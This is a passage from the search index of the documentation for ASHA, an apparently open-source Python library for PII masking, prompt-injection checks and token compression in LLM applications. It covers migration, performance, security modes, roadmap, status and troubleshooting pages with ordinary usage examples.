<code>asha.integrations.otel</code> <p>Middleware uses <code>mode=\"balanced\"</code> or <code>mode=\"off\"</code> \u2014 not a removed <code>privacy=</code> kwarg.</p>"},{"location":"integrations/#composition-helpers","title":"Composition helpers","text":"<pre><code>from asha.integrations.composition_strategy import (\n    compose_with_instructor,\n    compose_with_langchain,\n)\n</code></pre> <p>Requires optional deps (<code>instructor</code>, <code>langchain</code>).</p>"},{"location":"integrations/#test-integrations-locally","title":"Test integrations locally","text":"<p>Integration tests skip when optional deps are missing:</p> <pre><code>pip install asha-ai[integrations]\npytest tests/test_fastapi_integration.py -q\n</code></pre>"},{"location":"integrations/#related","title":"Related","text":"<ul> <li>Experimental features</li> <li>API reference</li> <li>Tutorial</li> </ul>"},{"location":"migration-v0.4/","title":"Migration Guide - v0.4.x","text":"<p>Upgrade from ASHA 0.3.x (or early 0.4.0) to 0.4.2. Also covers the PrivySHA \u2192 ASHA package rename.</p>"},{"location":"migration-v0.4/#0-package-rename-privysha-asha","title":"0. Package rename (PrivySHA \u2192 ASHA)","text":"Before After <code>pip install privysha</code> <code>pip install asha-ai</code> (pin pilots: <code>asha-ai==0.4.2</code>) <code>from privysha import process</code> <code>from asha import process</code> CLI <code>privysha</code> CLI <code>asha</code> Env vars <code>PRIVYSHA_*</code> Env vars <code>ASHA_*</code> PyPI name <code>asha-ai</code> (<code>asha</code> on PyPI is unrelated; imports stay <code>asha</code>) Repo / docs github.com/AjayRajan05/ASHA \u00b7 docs site <p>Uninstall the old package if both are present: <code>pip uninstall privysha</code> then <code>pip install asha-ai==0.4.2</code>.</p>"},{"location":"migration-v0.4/#1-return-types-are-dataclasses","title":"1. Return types are dataclasses","text":"<pre><code># Before (0.3)\ntext = process(\"a@b.com - analyze\")  # sometimes str\nresult = process(\"...\", return_metrics=True)\nprint(result[\"optimized\"])\n\n# After (0.4.2)\nresult = process(\"a@b.com - analyze\")\nprint(result.output)\nprint(result.metrics.token_reduction_pct)\nprint(result.security.pii_detected)\nstr(result)  # still works - equals result.output\n</code></pre> Old dict key New attribute <code>optimized</code> <code>result.output</code> <code>original</code> <code>result.original</code> <code>security_result</code> <code>result.security</code> <code>metrics</code> <code>result.metrics</code> <code>token_reduction</code> <code>result.metrics.token_reduction_pct</code> <p>Legacy dict: <code>result.to_dict()</code> or:</p> <pre><code>from asha.compat.legacy_results import to_legacy_pipeline_dict\nlegacy = to_legacy_pipeline_dict(process(\"...\", include_legacy_detail=True))\n</code></pre>"},{"location":"migration-v0.4/#2-import-paths","title":"2. Import paths","text":"<pre><code># Before\nfrom asha import wrap_llm, Pipeline, Processor, ProcessResult\n\n# After\nfrom asha import process, sanitize, optimize, Agent\nfrom asha.integrations import wrap_llm, auto_patch\nfrom asha.runtime import PromptProcessor\nfrom asha.types import ProcessResult\n</code></pre> <p>Removed symbols raise <code>AttributeError</code> at root.</p>"},{"location":"migration-v0.4/#3-kwargs-mode-policyconfig","title":"3. Kwargs \u2192 mode + PolicyConfig","text":"<pre><code># Before\nprocess(x, privacy=False)\nprocess(x, preserve_intent=True)\nprocess(x, pii_mode=\"hybrid\")\nprocess(x, security_fail_closed=True)\n\n# After\nprocess(x, mode=\"off\")\nprocess(x, policy=PolicyConfig(preserve_intent=True))\nprocess(x, policy=PolicyConfig(pii_mode=\"hybrid\"))\nprocess(x, mode=\"strict\")\n</code></pre> <p>Unknown kwargs raise <code>TypeError</code>.</p>"},{"location":"migration-v0.4/#4-optimize-is-tokens-only","title":"4. optimize() is tokens-only","text":"<pre><code>optimize(prompt)  # no PII, no compile - OptimizeResult only\nprocess(prompt)   # full path\nsanitize(prompt)  # security only\n</code></pre>"},{"location":"migration-v0.4/#5-wrap_llm-mode-only","title":"5. wrap_llm() - mode only","text":"<pre><code># Before\nwrap_llm(client, privacy=False)\n\n# After\nwrap_llm(client, mode=\"off\")\n</code></pre>"},{"location":"migration-v0.4/#6-pipeline-processor-removed","title":"6. Pipeline / Processor removed","text":"<pre><code># Before\nfrom asha import Pipeline\nPipeline().process(\"prompt\")\n\n# After\nfrom asha import process\nprocess(\"prompt\")\n\n# Advanced\nfrom asha.runtime import PromptProcessor\nPromptProcessor().run(\"prompt\", mode=\"balanced\")\n</code></pre>"},{"location":"migration-v0.4/#7-safety-semantics","title":"7. Safety semantics","text":"Mode process/sanitize wrap_llm (mode != \"off\") <code>strict</code> Raises on total failure Processing strict; infra errors raise <code>balanced</code> Degraded fallback Processing balanced; infra errors raise <code>off</code> Passthrough No preprocessing"},{"location":"migration-v0.4/#recommended-upgrade-steps","title":"Recommended upgrade steps","text":"<ol> <li>Pin <code>asha==0.4.2</code></li> <li>Replace <code>result[\"optimized\"]</code> \u2192 <code>result.output</code></li> <li>Move <code>from asha import wrap_llm</code> \u2192 <code>from asha.integrations import wrap_llm</code></li> <li>Replace deprecated kwargs with <code>mode</code> / <code>PolicyConfig</code></li> <li>Remove <code>Pipeline</code> / <code>Processor</code> usage</li> <li>Run tests; check <code>result.degraded</code> in balanced mode</li> </ol> <p>See deprecations.md for the full removal list.</p>"},{"location":"optimization/","title":"Optimization","text":"<p>How to reduce prompt tokens with ASHA's optimizer, alone or as part of <code>process()</code>.</p>"},{"location":"optimization/#compress-tokens-only","title":"Compress tokens only","text":"<p><code>optimize()</code> runs token compression only \u2014 no PII masking, no compile stage:</p> <pre><code>from asha import optimize\n\nresult = optimize(\"Hey bro can you please analyze this dataset thoroughly\")\nprint(result.output)\nprint(result.metrics.token_reduction_pct)\n</code></pre>"},{"location":"optimization/#optimize-as-part-of-process","title":"Optimize as part of process()","text":"<p>Full path includes security + compile + optimize:</p> <pre><code>from asha import process\n\nresult = process(\"long verbose prompt please analyze carefully\", token_budget=1200)\nprint(result.metrics.tokens_saved)\nprint(result.metrics.token_reduction_pct)\n</code></pre>"},{"location":"optimization/#skip-optimization-when-safe","title":"Skip optimization when safe","text":"<pre><code>from asha import process\nfrom asha.core.policy_config import PolicyConfig\n\nprocess(\n    prompt,\n    policy=PolicyConfig(preserve_intent=True),\n)\n</code></pre> <p>When no PII or threats are found, the original prompt may be returned unchanged.</p>"},{"location":"optimization/#modes-and-latency","title":"Modes and latency","text":"Mode Optimization level <code>balanced</code> Standard compression <code>strict</code> Aggressive + fail-closed security <code>lite</code> Reduced policy features <code>off</code> Skipped <p>For minimum latency: <code>mode=\"off\"</code> or call <code>optimize()</code> alone on already-clean prompts.</p>"},{"location":"optimization/#read-metrics","title":"Read metrics","text":"<pre><code>from asha import process\n\nresult = process(prompt)\nm = result.metrics\nprint(m.token_reduction_pct)\nprint(m.tokens_saved)\nprint(m.processing_time_ms)\n</code></pre> <p>Token-reduction figures vary widely by input shape \u2014 measure with performance.md rather than assuming a fixed percentage.</p>"},{"location":"optimization/#optimize-vs-process","title":"optimize() vs process()","text":"Function Security Compile Optimize <code>optimize()</code> No No Yes <code>sanitize()</code> Yes No No <code>process()</code> Yes Yes Yes"},{"location":"optimization/#related","title":"Related","text":"<ul> <li>Performance</li> <li>Core concepts</li> </ul>"},{"location":"performance/","title":"Performance","text":"<p>ASHA v0.4.2 \u2014 how to measure performance, and how to tune latency vs security.</p> <p>Numbers below that come from a committed baseline are labeled as such. Re-run on your hardware before treating any figure as a target.</p>"},{"location":"performance/#how-to-run-benchmarks","title":"How to run benchmarks","text":"<pre><code>pip install -e .\npython benchmarks/run_benchmarks.py --save\n</code></pre> <p>Compare against the committed baseline:</p> <pre><code>python benchmarks/run_benchmarks.py --compare benchmarks/baseline/results.json\nasha benchmark --save\n</code></pre> <p>What the harness measures (<code>asha.core.benchmark.BenchmarkHarness</code>):</p> <ul> <li>PII detection / masking coverage on sample prompts</li> <li>Token-reduction metrics</li> <li>Latency (avg, P95, P99)</li> <li>Fail-safe rate</li> <li>False-positive checks (teaching emails skipped)</li> </ul> <p>Sample prompts: <code>benchmarks/sample_prompts.json</code>.</p> <p>Programmatic:</p> <pre><code>from asha.core.benchmark import BenchmarkHarness\n\nharness = BenchmarkHarness()\nsummary = harness.run_all(mode=\"balanced\")\nprint(summary)\n</code></pre>"},{"location":"performance/#baseline-artifact","title":"Baseline artifact","text":"Path Description <code>benchmarks/baseline/results.json</code> Committed baseline (re-run after major changes) <code>benchmarks/output/</code> Timestamped local runs <p>The committed baseline currently reports (rule-based / lite-style install on the machine that produced it):</p> Metric Baseline value P95 pipeline latency ~58 ms Fail-safe rate 1.0 False-positive rate 0.0 <p>These are not SLAs. Re-run the harness for current numbers on your stack. Do not publish or rely on token-reduction marketing figures without a fresh local run \u2014 summary reduction can be near zero while individual prompt metrics vary by input shape.</p>"},{"location":"performance/#ci-gates-reference","title":"CI gates (reference)","text":"<p>On push (Ubuntu, Python 3.11), CI runs architecture tests, coverage floor, benchmark smoke/regression vs baseline, and related quality gates. See repository workflows for the exact thresholds in force.</p> <p>Semantic equivalence gate: CI requires at least ~30% of benchmark prompt pairs to pass <code>check_semantic_equivalence</code>. That is a smoke / regression floor, not a production SLA and not a claim that optimization preserves meaning. Treat it as \u201cthe pipeline did not totally scramble the suite,\u201d then validate on your own prompts.</p>"},{"location":"performance/#how-to-tune","title":"How to tune","text":"Priority Settings Speed <code>mode=\"lite\"</code> or <code>mode=\"off\"</code>; <code>PolicyConfig(pii_mode=\"rule\")</code> Security <code>mode=\"strict\"</code>; <code>PolicyConfig(pii_mode=\"hybrid\")</code> (needs <code>asha-ai[ml]</code>) Token savings Lower <code>token_budget</code>; keep optimization enabled Semantic fidelity <code>PolicyConfig(preserve_intent=True)</code>"},{"location":"performance/#fastest-path","title":"Fastest path","text":"<pre><code>from asha import process\n\nresult = process(prompt, mode=\"lite\")\n# or\nresult = process(prompt, mode=\"off\")\n</code></pre> <p>Avoid on hot paths: <code>trace=True</code>, <code>debug=True</code>, and ML PII until you need them.</p>"},{"location":"performance/#maximum-security-posture","title":"Maximum security posture","text":"<pre><code>from asha import process\nfrom asha.core.policy_config import PolicyConfig\n\nresult = process(\n    prompt,\n    mode=\"strict\",\n    policy=PolicyConfig(pii_mode=\"hybrid\", security_level=\"high\"),\n)\n</code></pre>"},{"location":"performance/#async-batching","title":"Async batching","text":"<pre><code>import asyncio\nfrom asha.utils.dropin import process_async\n\nasync def batch(prompts):\n    return await asyncio.gather(\n        *[process_async(p, mode=\"lite\") for p in prompts]\n    )\n</code></pre>"},{"location":"performance/#per-call-knobs","title":"Per-call knobs","text":"<p>All on <code>process()</code> \u2014 no global config.</p> Parameter Effect <code>mode</code> Policy preset <code>policy</code> <code>pii_mode</code>, <code>security_level</code>, <code>preserve_intent</code>, \u2026 <code>token_budget</code> Optimization target (default 1200) <code>timeout_seconds</code> Abort after N seconds <code>max_retries</code> Retry transient failures"},{"location":"performance/#agent","title":"Agent","text":"<pre><code>from asha import Agent\n\nagent = Agent(model=\"mock\", privacy=True, token_budget=800)\n</code></pre> <p><code>privacy=True</code> maps to strict internal preprocessing. Or preprocess with <code>process()</code> yourself.</p>"},{"location":"performance/#wall-clock-check","title":"Wall-clock check","text":"<pre><code>import time\nfrom asha import process\n\nstart = time.perf_counter()\nresult = process(\"prompt\", mode=\"balanced\")\nprint(f\"Wall: {(time.perf_counter() - start) * 1000:.1f} ms\")\nprint(f\"Reported: {result.metrics.processing_time_ms} ms\")\n</code></pre>"},{"location":"performance/#production-checklist","title":"Production checklist","text":"<ol> <li>Default <code>mode=\"balanced\"</code> unless you have a reason not to</li> <li>Leave <code>trace</code> / <code>debug</code> off on every request</li> <li>Use <code>pii_mode=\"rule\"</code> unless ML NER is required</li> <li>Use <code>mode=\"strict\"</code> on regulated paths</li> <li>Log <code>result.degraded</code></li> <li>Pin <code>asha==0.4.2</code></li> </ol>"},{"location":"performance/#related","title":"Related","text":"<ul> <li>Optimization</li> <li>Security</li> <li>Status</li> </ul>"},{"location":"production-readiness/","title":"Production readiness (0.4.2)","text":"<p>ASHA remains v0.4.2 developer preview. This page supports pinned pilots today and records what a future 1.0 would need \u2014 it is not a plan to ship 1.0 soon.</p> <p>Finish release leftovers and in-version work first. Do not bump the version for 1.0 until the maintainer is ready to stand behind a stable guarantee.</p>"},{"location":"production-readiness/#release-setup-status-042","title":"Release setup status (0.4.2)","text":"Item Status <code>asha-models-0.4.2</code> GitHub Release asset Done \u2014 auto-download URL in PRIVATE_ARTIFACTS GitHub Discussions Enabled \u2014 discussions Optional Slack invite Live \u2014 join; see support.md <p>Hardened installs download the official bundle on first use; override with <code>ASHA_MODELS_DIR</code> / <code>ASHA_MODELS_ZIP</code> / <code>ASHA_DISABLE_MODEL_DOWNLOAD=1</code> (see status.md).</p>"},{"location":"production-readiness/#production-pilot-checklist-042-today","title":"Production-pilot checklist (0.4.2 today)","text":"<ul> <li>[ ] Pin <code>asha==0.4.2</code></li> <li>[ ] Use lite path unless you validated hardened models locally or via cache</li> <li>[ ] ANCHOR: <code>interactive=False</code> in CI/scripts; validate adapters on your stack (anchor.md matrix)</li> <li>[ ] Read security.md fail-closed / opt-out flags</li> <li>[ ] No secrets or private <code>data/</code> / unreleased weights in deploy artifacts</li> <li>[ ] Support expectations: support.md (best-effort, no SLA)</li> </ul>"},{"location":"production-readiness/#future-10-deferred","title":"Future 1.0 (deferred)","text":"<p>Only consider 1.0.0 after 0.4.2 is complete and the maintainer is ready. All of the following would need to be true then:</p> <ol> <li>Models distribution \u2014 default <code>asha-models</code> URL returns 200; clean <code>pip install asha-ai[hardened]</code> works without local zip.</li> <li>API freeze window \u2014 a deliberate deprecation-only period on the public root + <code>wrap_llm</code> surface.</li> <li>Community signal \u2014 feedback channels used; no open P0 security issues without a documented mitigation.</li> <li>Docs freeze \u2014 status, versioning, migration, and support docs match shipped behavior.</li> <li>CI green on supported Python versions; architecture + ANCHOR golden-path jobs required.</li> </ol>"},{"location":"production-readiness/#public-api-candidates-eventual","title":"Public API candidates (eventual)","text":"Surface Intent if/when 1.0 <code>process</code> / <code>sanitize</code> / <code>optimize</code> Stable Typed results (<code>ProcessResult</code>, \u2026) Stable <code>wrap_llm</code> Stable (prefer over <code>auto_patch</code>) <code>Agent</code> mock + basic providers Stable within documented providers <code>anchor()</code> / golden adapters Preview until ready to graduate Experimental (AshaFit, <code>auto_patch</code>, smart routing) Stay experimental or graduate via CHANGELOG"},{"location":"production-readiness/#related","title":"Related","text":"<ul> <li>roadmap.md</li> <li>versioning.md</li> <li>SUPPORT.md</li> <li>GitHub Discussions \u00b7 Slack</li> </ul>"},{"location":"roadmap/","title":"Roadmap","text":"<p>Forward-looking plan from v0.4.2 (July 2026). Dates are estimates.</p>"},{"location":"roadmap/#shipped-in-v042","title":"Shipped in v0.4.2","text":"<ul> <li>Package rename: <code>privysha</code> \u2192 <code>asha</code> (PyPI, imports, CLI)</li> <li>ANCHOR mission-aware agent governance (<code>anchor()</code>, guards, sandbox, human approval)</li> <li>Framework adapters: CrewAI, LangChain, AutoGen, LlamaIndex, MCP, LangGraph, generic</li> <li>ANCHOR extras (<code>asha-ai[anchor]</code>, per-framework installs) + golden-path CI</li> <li>CI/publish workflows updated for <code>asha</code> package layout</li> <li>Integration test job with optional framework deps in CI</li> </ul>"},{"location":"roadmap/#productization-phase-4-done","title":"Productization (Phase 4 \u2014 done)","text":"<ul> <li>Published support policy / repo <code>SUPPORT.md</code></li> <li>Community intake: GitHub Issues templates + Discussions as primary channel</li> <li>Docs freeze pass for 0.4.2 preview claims (status, ANCHOR matrix, install tiers)</li> <li>Post-release setup done for Discussions, Slack invite, and <code>asha-models-0.4.2</code> asset</li> </ul>"},{"location":"roadmap/#current-focus-finish-042","title":"Current focus \u2014 finish 0.4.2","text":"<p>Version stays 0.4.2. No rush to 1.0. Keep the developer-preview story honest and ship remaining surface polish. A future 1.0 is documented for later \u2014 see production-readiness.md \u2014 not an active milestone.</p>"},{"location":"roadmap/#shipped-in-v041","title":"Shipped in v0.4.1","text":"<ul> <li>Frozen root API (<code>process</code>, <code>sanitize</code>, <code>optimize</code>, <code>Agent</code>)</li> <li><code>PromptProcessor</code> as sole orchestrator (security \u2192 compile \u2192 optimize)</li> <li>Typed <code>ProcessResult</code> / <code>SanitizeResult</code> / <code>OptimizeResult</code></li> <li>Unified <code>mode=</code> safety semantics</li> <li><code>runtime/resolve.py</code> - no compat on hot path</li> <li>Architecture boundary tests in CI</li> <li>Dead legacy code removed (<code>Pipeline</code>, <code>ModelRouter</code>, <code>debug/</code> package, etc.)</li> <li><code>wrap_llm</code> / <code>auto_patch</code> in <code>asha.integrations</code></li> </ul>"},{"location":"roadmap/#v05x-target-h2-2026","title":"v0.5.x (target: H2 2026)","text":"<ul> <li>API freeze - deprecation warnings only, no breaking removals</li> <li>Container sandbox backends (<code>docker</code>, <code>bwrap</code>)</li> <li>Prompt caching for repeated patterns</li> <li>Expanded international PII formats</li> <li>PyPI classifier \u2192 Beta</li> </ul>"},{"location":"roadmap/#v100-deferred-only-after-04x-is-solid","title":"v1.0.0 (deferred \u2014 only after 0.4.x is solid)","text":"<p>Not scheduled. Stay on 0.4.2 until the maintainer is ready to acknowledge a stable API. Checklist for that eventual day: production-readiness.md.</p> <p>Not committed for 1.0: managed cloud service, multi-tenant SaaS, paid SLA.</p>"},{"location":"roadmap/#preview-features-may-change-anytime","title":"Preview features (may change anytime)","text":"Feature Module ANCHOR framework adapters (non-CrewAI) <code>runtime/anchor/adapters/</code> AshaFit local advisor <code>runtime/local_advisor/</code> Hybrid ML PII <code>core/hybrid_pii.py</code> + <code>pii_pipeline/</code> <code>auto_patch()</code> <code>integrations/auto_patch.py</code> Framework middleware <code>integrations/fastapi</code>, <code>langchain</code>, etc."},{"location":"roadmap/#long-term-ideas","title":"Long-term ideas","text":"<ul> <li>Cost-aware multi-model routing</li> <li>Prometheus metrics export expansion</li> <li>Prompt caching engine</li> <li>Native function-calling in <code>asha.Agent</code> tool loop</li> </ul> <p>See status.md for current limitations. Preview/experimental APIs: experimental-features.md.</p>"},{"location":"security/","title":"Security","text":"<p>How to detect and mask PII, check prompt-injection patterns, and choose fail-closed vs fail-open behavior.</p> <p>Security is the first engine in <code>process()</code> and the only engine in <code>sanitize()</code>.</p> <p>Developer preview</p> <p>Pin <code>asha==0.4.2</code>. Public docs describe what is defended against and the general shape of the defense (layered detection, calibrated fail-closed behavior) \u2014 not internal scoring mechanics.</p>"},{"location":"security/#detect-pii-and-threats","title":"Detect PII and threats","text":"<pre><code>from asha import process, sanitize\n\nresult = process(\"Contact john@company.com or 555-123-4567\", mode=\"balanced\")\nprint(result.output)\nprint(result.security.pii_detected)\nprint(result.security.threats)\nprint(result.security.threat_level)\n</code></pre>"},{"location":"security/#common-pii-types-rule-based-path","title":"Common PII types (rule-based path)","text":"Type Examples Email <code>user@example.com</code> Phone <code>555-123-4567</code> SSN <code>123-45-6789</code> Credit card <code>4111-1111-1111-1111</code> API key / secret <code>sk-...</code> JWT <code>eyJ...</code> IP address <code>192.168.1.1</code> Address / name Heuristic with context keywords <p>Teaching placeholders like <code>test@example.com</code> are skipped.</p> <p>Mask tokens look like <code>[EMAIL_HASH]_\u2026</code>, <code>[PHONE_HASH]_\u2026</code>, or <code>[REDACTED]</code> for high-risk secrets.</p>"},{"location":"security/#document-inputs-pdf-docx-text-files","title":"Document inputs (PDF / DOCX / text files)","text":"<p><code>process()</code>, <code>sanitize()</code>, and <code>optimize()</code> accept a file path, <code>Path</code>, or bytes (pass <code>filename=</code> for bytes). Text is extracted (no OCR), then the normal PII/security pipeline runs.</p> <pre><code>from asha import sanitize, process\nfrom pathlib import Path\n\nsanitize(Path(\"report.pdf\"))          # extract + mask\nprocess(\"notes.docx\", mode=\"balanced\")\nsanitize(raw_bytes, filename=\"memo.docx\")\n</code></pre> <p>Supported text documents on the base install: <code>.txt</code>, <code>.md</code>, <code>.csv</code>, <code>.html</code>, <code>.pdf</code>, <code>.docx</code>.</p> <p>With <code>wrap_llm</code>, local file attachments in the request (message file parts, <code>files=</code> / path kwargs the wrapper can see) are extracted and PII-masked before the call is sent to the provider. Opaque provider <code>file_id</code> uploads without local bytes cannot be read \u2014 upload masked text instead, or pass a local path/bytes the wrapper can see.</p>"},{"location":"security/#choose-a-safety-mode","title":"Choose a safety mode","text":"<pre><code>from asha import process, sanitize\n\nprocess(prompt, mode=\"balanced\")  # fail-open fallback (default)\nprocess(prompt, mode=\"strict\")    # raises ASHAProcessingError on total failure\nsanitize(prompt, mode=\"strict\")\n</code></pre> Mode On total security failure <code>balanced</code> / <code>lite</code> Degraded result, <code>degraded=True</code> <code>strict</code> Raises <code>off</code> Passthrough"},{"location":"security/#configure-pii-mode","title":"Configure PII mode","text":"<p>Set via <code>PolicyConfig</code> (not a top-level kwarg on <code>process()</code>):</p> <pre><code>from asha import process\nfrom asha.core.policy_config import PolicyConfig\n\nprocess(\"Contact john@example.com\", policy=PolicyConfig(pii_mode=\"rule\"))\nprocess(\"...\", policy=PolicyConfig(pii_mode=\"lite\"))     # alias of rule-style lite path\nprocess(\"...\", policy=PolicyConfig(pii_mode=\"hybrid\"))   # default; needs asha-ai[ml] for full NER\n</code></pre> <code>pii_mode</code> Description Install <code>hybrid</code> Default \u2014 rules + ML when available; soft-falls back without ML deps Core; full NER needs <code>asha-ai[ml]</code> <code>rule</code> / <code>lite</code> Regex + heuristic only Core only <code>ml_only</code> Experimental ML-only path <code>asha-ai[ml]</code> <p>For stronger classical ML detectors, install <code>asha-ai[hardened]</code>. Detector weights download automatically on first use into a local cache (no permission prompt). Override with <code>ASHA_MODELS_DIR</code> for air-gapped installs, or set <code>ASHA_DISABLE_MODEL_DOWNLOAD=1</code> to force lite fallbacks. Base installs need no model files \u2014 that is the path meant for everyone.</p>"},{"location":"security/#sanitize-only","title":"Sanitize only","text":"<pre><code>from asha import sanitize\n\nresult = sanitize(\"john@corp.com - summarize\")\nprint(result.safe)\nprint(result.security.pii_detected)\n</code></pre>"},{"location":"security/#reversible-masking","title":"Reversible masking","text":"<pre><code>from asha import sanitize\nfrom asha.core.policy_config import PolicyConfig\nfrom asha.utils.unmask import unmask\n\nresult = sanitize(\n    \"Email alice@corp.com\",\n    policy=PolicyConfig(reversible=True),\n)\nrestored = unmask(llm_output, result.security.masking_map)\n</code></pre> <p>Store <code>masking_map</code> securely \u2014 it can reverse pseudonymization.</p>"},{"location":"security/#secure-an-existing-sdk-client","title":"Secure an existing SDK client","text":"<pre><code>from asha.integrations import wrap_llm\n\nclient = wrap_llm(openai_client, mode=\"balanced\")\n</code></pre> <ul> <li>Uses the caller's <code>mode</code> for preprocessing</li> <li>Infrastructure/wrap failures raise when <code>mode != \"off\"</code> (never silently send raw prompts)</li> </ul>"},{"location":"security/#defense-shape-explanation-for-operators","title":"Defense shape (explanation for operators)","text":"<p>ASHA stacks multiple checks rather than relying on a single pattern list:</p> <ol> <li>Rule/heuristic detectors available on every install</li> <li>Optional ML/NER paths when extras are installed</li> <li>Calibrated fail-closed behavior on uncertain scores (escalate to REVIEW / restrictive defaults rather than silent ALLOW)</li> </ol> <p>Exact thresholds, model artifacts, and feature representations are intentionally not documented in public guides.</p>"},{"location":"security/#related","title":"Related","text":"<ul> <li>Compliance</li> <li>Core concepts</li> <li>FAQ</li> <li>Status</li> </ul>"},{"location":"status/","title":"Status","text":"<p>ASHA v0.4.2 \u2014 developer preview (pre-1.0). APIs may still change before 1.0.</p> <pre><code>pip install asha-ai\n</code></pre> <p>That is the default lite path for everyone. When you run a long-lived pilot, pin the version you validated (for example <code>asha==0.4.2</code>) so upgrades are intentional.</p>"},{"location":"status/#who-should-use-what","title":"Who should use what","text":"You want\u2026 Use Works for everyone, no keys, no downloads <code>pip install asha-ai</code> then <code>process</code> / <code>sanitize</code> / <code>optimize</code> Drop into an existing OpenAI-style client <code>wrap_llm</code> (<code>asha-ai[openai]</code> as needed) Govern an agent <code>anchor(..., interactive=False)</code> \u2014 preview; validate on your stack Stronger ML detectors <code>asha-ai[hardened]</code> \u2014 models auto-download on first use (no prompt); override with <code>ASHA_MODELS_DIR</code> if needed"},{"location":"status/#works-today","title":"Works today","text":"Area Notes <code>process()</code>, <code>sanitize()</code>, <code>optimize()</code> Stable within 0.4.x \u2014 primary path for most apps Typed results (<code>ProcessResult</code>, \u2026) Default since v0.4.0 Policy modes (<code>balanced</code>, <code>strict</code>, <code>lite</code>, <code>off</code>) Unified safety semantics <code>wrap_llm()</code> (<code>asha.integrations</code>) Prefer over <code>auto_patch()</code>; pin the version Provider adapters Optional extras (<code>openai</code>, <code>anthropic</code>, <code>gemini</code>, mock, \u2026) PII masking Default <code>pii_mode=\"hybrid\"</code>; soft-falls back without ML \u2014 use <code>\"rule\"</code> / <code>\"lite\"</code> for regex-only Lite detectors Always available on base install (no private artifacts) Architecture + CI gates Layer boundaries enforced in tests"},{"location":"status/#in-progress-preview","title":"In progress / preview","text":"Area Notes ANCHOR (<code>anchor()</code>, guards, sandbox) Preview \u2014 pin <code>0.4.2</code>; validate on your agent stack Framework adapters Golden: CrewAI / LangChain / LangGraph via <code>asha-ai[anchor]</code>; LlamaIndex + MCP best-effort; see anchor.md support matrix Hybrid / ML PII Needs <code>asha-ai[ml]</code> / <code>asha-ai[hardened]</code> for full NER Hardened ML artifacts Auto-downloaded bundle (<code>asha-models-0.4.2</code>); disable with <code>ASHA_DISABLE_MODEL_DOWNLOAD=1</code> Container sandbox (<code>docker</code>, <code>bwrap</code>) Not implemented \u2014 use <code>isolation=\"hard\"</code>"},{"location":"status/#experimental","title":"Experimental","text":"<p>APIs may change without a deprecation cycle. Details: experimental-features.md.</p> Feature Entry point AshaFit / local advisor <code>recommend_local_model</code>, <code>Agent(local_model=...)</code> Smart routing <code>Agent(routing_config=...)</code> / <code>SmartRoutingAdapter</code> Model gateway extras <code>AdapterFactory</code>, advanced <code>wrap_llm</code> options <code>auto_patch()</code> Prefer <code>wrap_llm()</code>"},{"location":"status/#not-ready-do-not-claim","title":"Not ready (do not claim)","text":"<ul> <li>Stable 1.0 API guarantee</li> <li>Certified compliance product (tooling only \u2014 see compliance.md)</li> <li>Semantic optimization guarantees</li> <li>Broad ANCHOR production certification across every framework</li> <li>Paid support / SLA (community best-effort only \u2014 see support.md)</li> </ul> <p>Community: GitHub Discussions \u00b7 Slack.</p> <p>Forward-looking detail: roadmap.md. Pilot checklist (stay on 0.4.2): production-readiness.md.</p>"},{"location":"support/","title":"Support policy","text":"<p>ASHA v0.4.2 is a developer preview. Support for the open-source project is best-effort \u2014 there is no paid SLA.</p>"},{"location":"support/#channels","title":"Channels","text":"Need Where Questions / design talk GitHub Discussions Bugs / features GitHub Issues Chat (optional) ASHA Slack Security Email per SECURITY.md \u2014 never public issues Contributing contributing.md <p>Canonical short policy: SUPPORT.md in the repo root. Docs site: ajayrajan05.github.io/ASHA.</p>"},{"location":"support/#expectations","title":"Expectations","text":"<ul> <li>Maintainers respond when available; response times are not guaranteed.</li> <li>Pin <code>asha==0.4.2</code> for pilots so upgrades are intentional.</li> <li>Prefer a minimal repro over large private code dumps.</li> <li>Hardened models and ANCHOR framework extras are optional \u2014 see status.md.</li> </ul>"},{"location":"support/#before-opening-an-issue","title":"Before opening an issue","text":"<ol> <li>Check troubleshooting.md and faq.md.</li> <li>Confirm your extras and env vars (<code>ASHA_DISABLE_ML</code>, <code>ASHA_MODELS_DIR</code>, \u2026).</li> <li>Use an issue template when available.</li> </ol>"},{"location":"troubleshooting/","title":"Troubleshooting","text":"<p>ASHA v0.4.2</p>"},{"location":"troubleshooting/#installation","title":"Installation","text":""},{"location":"troubleshooting/#importerror-no-module-named-asha","title":"ImportError: No module named 'asha'","text":"<pre><code>pip install asha-ai\n# or\npip install -e .\n</code></pre>"},{"location":"troubleshooting/#importerror-cannot-import-wrap_llm-from-asha","title":"ImportError: cannot import wrap_llm from asha","text":"<p>Root no longer exports <code>wrap_llm</code>:</p> <pre><code>from asha.integrations import wrap_llm\n</code></pre>"},{"location":"troubleshooting/#typeerror-unexpected-keyword-argument","title":"TypeError: unexpected keyword argument","text":"<p>Deprecated kwargs were removed. Use <code>mode</code> and <code>PolicyConfig</code>:</p> <pre><code>from asha.core.policy_config import PolicyConfig\nprocess(prompt, policy=PolicyConfig(pii_mode=\"hybrid\"))\n</code></pre>"},{"location":"troubleshooting/#pii-not-masked","title":"PII not masked","text":"<pre><code>from asha import process\nfrom asha.core.policy_config import PolicyConfig\n\nprocess(prompt, mode=\"strict\")\nprocess(prompt, policy=PolicyConfig(pii_mode=\"hybrid\"))  # needs asha-ai[ml]\n</code></pre> <p>Check <code>mode=\"off\"</code> is not set. Check output via <code>result.output</code>, not raw input.</p>"},{"location":"troubleshooting/#ml-hybrid-pii-fails","title":"ML / hybrid PII fails","text":"<pre><code>pip install asha-ai[ml]\n</code></pre> <p>Without ML deps, <code>pii_mode=\"hybrid\"</code> falls back to <code>rule</code>.</p>"},{"location":"troubleshooting/#process-returns-unexpected-type","title":"process() returns unexpected type","text":"<p>v0.4+ always returns <code>ProcessResult</code>:</p> <pre><code>result = process(\"prompt\")\nprint(result.output)   # not result[\"optimized\"]\nstr(result)            # works\n</code></pre>"},{"location":"troubleshooting/#wrap_llm-errors","title":"wrap_llm errors","text":"<ul> <li>Use <code>mode=\"off\"</code> only when you intentionally want no preprocessing</li> <li><code>mode=\"strict\"</code> raises on processing failure</li> <li>Prefer <code>wrap_llm()</code> over <code>auto_patch()</code> in shared environments</li> </ul>"},{"location":"troubleshooting/#agent-connection-errors","title":"Agent connection errors","text":"<pre><code>agent = Agent(model=\"mock\")  # no API key needed for tests\n</code></pre> <p>For real providers, set <code>OPENAI_API_KEY</code> etc. and <code>pip install asha-ai[openai]</code>.</p>"},{"location":"troubleshooting/#slow-processing","title":"Slow processing","text":"<pre><code>process(prompt, mode=\"lite\")\nprocess(prompt, mode=\"off\")\n</code></pre> <p>Avoid <code>trace=True</code> and 